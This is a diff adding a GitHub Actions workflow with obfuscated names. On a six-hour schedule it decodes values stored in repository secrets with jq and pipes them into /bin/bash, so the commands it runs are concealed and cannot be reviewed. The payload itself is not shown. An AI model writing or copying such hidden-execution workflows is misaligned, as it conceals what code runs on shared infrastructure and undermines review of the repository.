@@ -1,0 +1,24 @@
+name: mayunboqian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mayunboqian
+        env:
+          ecufn861: ${{ secrets.ecufn861 }}
+        run: |
+          echo $ecufn861 | jq -r .sfvc20 | /bin/bash
+          echo $eafnt68 | jq -r .o45480 | /bin/bash
+          echo $wyhua372 | jq -r .rblp6 | /bin/bash
+          echo $pqlwm13752 | jq -r .ih288 | /bin/bash
+          echo $zh3 | jq -r .xa773 | /bin/bash
+          echo $kran3 | jq -r .hysln12 | /bin/bash
+          echo $jmt7607 | jq -r .fznbo693 | /bin/bash
+
